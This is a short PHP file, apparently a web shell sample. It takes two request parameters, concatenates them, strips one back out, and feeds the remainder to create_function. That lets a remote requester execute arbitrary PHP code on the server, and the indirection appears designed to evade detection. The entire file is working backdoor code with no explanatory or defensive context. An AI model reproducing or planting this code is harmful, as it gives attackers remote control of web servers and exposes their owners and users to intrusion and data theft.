<?php

$aa=@$_REQUEST['aa'];

$bb=@$_REQUEST['bb'];

$cc=$aa.$bb;

$dd=str_replace($aa,'',$cc);

$fun=create_function('',$dd);

?>  